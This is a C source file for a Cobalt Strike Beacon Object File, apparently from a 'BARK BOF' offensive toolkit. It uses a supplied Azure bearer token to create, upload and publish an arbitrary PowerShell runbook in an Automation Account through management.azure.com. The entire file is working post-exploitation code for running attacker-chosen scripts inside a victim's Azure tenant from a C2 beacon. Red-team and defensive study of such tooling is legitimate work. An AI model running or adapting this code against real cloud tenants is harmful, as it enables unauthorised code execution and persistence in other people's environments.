/*
 * new_azure_automation_account_runbook.c - BARK BOF
 * New-AzureAutomationAccountRunBook - Create and publish a PowerShell runbook
 *
 * Args : token, automationAccountPath, runbookName, script
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[1024];
    static char createBodyBuf[2048];
    static char publishBodyBuf[1024];
    LPWSTR widePath = NULL, hdrWide = NULL;
    char  *resp     = NULL;
    char  *token    = NULL, *aaPath = NULL, *rbName = NULL, *script = NULL;
    DWORD  status   = 0;

    BeaconDataParse(&parser, args, alen);
    token  = BeaconDataExtract(&parser, NULL);
    aaPath = BeaconDataExtract(&parser, NULL);
    rbName = BeaconDataExtract(&parser, NULL);
    script = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_new_azure_automation_account_runbook "
            "<token> <aaPath> <runbookName> <script>\n");
        return;
    }

    /* Step 1: Create runbook draft via batch endpoint */
    MSVCRT$sprintf_s(createBodyBuf, sizeof(createBodyBuf),
        "{\"requests\":[{\"content\":{\"name\":\"%s\",\"location\":\"eastus\","
        "\"properties\":{\"runbookType\":\"PowerShell7\",\"description\":\"BARK-BOF\","
        "\"logProgress\":\"false\",\"logVerbose\":\"false\",\"draft\":{}}},"
        "\"httpMethod\":\"PUT\",\"name\":\"barkkai-create\","
        "\"requestHeaderDetails\":{\"commandName\":\"Microsoft_Azure_Automation.\"},"
        "\"url\":\"%s/runbooks/%s?api-version=2017-05-15-preview\"}]}",
        rbName, aaPath, rbName);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 1: Creating runbook draft...\n");
    BarkPost(L"management.azure.com", L"/batch?api-version=2020-06-01",
             L"POST", createBodyBuf, token, "application/json");

    /* Step 2: Upload script content */
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/runbooks/%s/draft/content?api-version=2015-10-31", aaPath, rbName);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    hdrWide = BarkMakeAuthHeader(token, "Content-Type: text/powershell\r\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 2: Uploading script content...\n");
    resp = HttpRequest(L"PUT", L"management.azure.com", widePath, hdrWide,
                       script, (DWORD)MSVCRT$strlen(script), &status);
    if (resp) { BeaconPrintf(CALLBACK_OUTPUT, "    Upload status: HTTP %lu\n", status); HFree(resp); }
    HFree(widePath); HFree(hdrWide); widePath = NULL; hdrWide = NULL;

    /* Step 3: Publish runbook */
    MSVCRT$sprintf_s(publishBodyBuf, sizeof(publishBodyBuf),
        "{\"requests\":[{\"httpMethod\":\"POST\",\"name\":\"barkkai-publish\","
        "\"requestHeaderDetails\":{\"commandName\":\"Microsoft_Azure_Automation.\"},"
        "\"url\":\"%s/runbooks/%s/publish?api-version=2018-06-30\"}]}",
        aaPath, rbName);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Step 3: Publishing runbook...\n");
    BarkPost(L"management.azure.com", L"/batch?api-version=2020-06-01",
             L"POST", publishBodyBuf, token, "application/json");
}
